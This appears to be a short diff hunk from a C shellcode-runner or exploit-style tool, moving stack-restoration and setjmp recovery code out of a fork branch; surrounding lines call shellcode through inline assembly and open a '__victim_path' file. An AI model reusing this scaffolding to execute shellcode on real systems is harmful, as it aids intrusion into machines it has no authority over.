@@ -170,22 +170,22 @@ int main(int argc, char **argv) {
 
     printf("[*] Executing the shellcode..\n");
     __asm__ __volatile__("call *%%eax\r\n" : : "a"(pcall));
-
-    printf("[*] Setting jump breakpoint after catching SIGCHLD signal..\n");
-    setjmp(__cont);
-
-    printf("[*] Restoring the stack..\n");
-    set_stack(sstate.thread_stack);
-
-    if ((unsigned long)get_stack() != (unsigned long)sstate.thread_stack) {
-      printf("[-] Stack restoration failed. Fallback..\n");
-      exit(1);
-    }
-
-    printf("[*] Stack restored.\n");
   } else {
     waitpid(pid, &wstatus, WUNTRACED | WCONTINUED);
   }
+
+  printf("[*] Setting jump breakpoint after catching SIGCHLD signal..\n");
+  setjmp(__cont);
+
+  printf("[*] Restoring the stack..\n");
+  set_stack(sstate.thread_stack);
+
+  if ((unsigned long)get_stack() != (unsigned long)sstate.thread_stack) {
+    printf("[-] Stack restoration failed. Fallback..\n");
+    exit(1);
+  }
+
+  printf("[*] Stack restored.\n");
 
   if ((fd = open(__victim_path, O_RDONLY)) < 0) {
     perror("open()");
